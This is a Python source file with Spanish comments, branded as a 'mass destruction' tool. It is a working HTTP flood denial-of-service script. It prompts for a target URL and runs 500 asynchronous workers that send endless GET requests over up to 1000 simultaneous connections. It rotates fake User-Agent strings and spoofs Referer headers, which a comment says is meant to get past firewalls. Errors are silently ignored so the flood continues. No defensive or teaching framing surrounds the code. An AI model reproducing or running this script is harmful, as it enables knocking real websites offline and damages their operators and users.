import asyncio
import aiohttp
import random
import os
import time
from colorama import Fore, Style, init

init()

# Identidades de sitios confiables para penetrar firewalls
REFERERS = [
    "https://www.google.com/", "https://www.facebook.com/", 
    "https://www.bing.com/", "https://twitter.com/", "https://t.co/"
]

async def ataque_masivo(target, session, worker_id):
    peticiones_enviadas = 0
    while True:
        try:
            headers = {
                'User-Agent': f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) {random.randint(1,100)}",
                'Referer': random.choice(REFERERS),
                'Connection': 'keep-alive'
            }
            # Lanzamos la solicitud sin esperar la respuesta completa (Fuego rápido)
            async with session.get(target, headers=headers, timeout=1) as response:
                peticiones_enviadas += 1
                if peticiones_enviadas % 100 == 0:
                    print(f"{Fore.RED}[BOMBA-X]{Fore.WHITE} Worker {worker_id} -> 100 ráfagas entregadas")
        except:
            # Si el servidor falla, seguimos presionando más fuerte
            pass

async def main():
    os.system('clear')
    print(f"{Fore.RED}{Style.BRIGHT}SENTINELA-X: MODO DESTRUCCIÓN MASIVA")
    print(f"ESTADO: CARGANDO UN MILLÓN DE SOLICITUDES...{Style.RESET_ALL}\n")
    
    target = input("URL OBJETIVO: ")
    
    # Creamos un pool de 1000 conexiones simultáneas
    connector = aiohttp.TCPConnector(limit=1000)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = []
        for i in range(500): # 500 trabajadores asíncronos
            tasks.append(ataque_masivo(target, session, i))
        
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[+] Ataque detenido.")
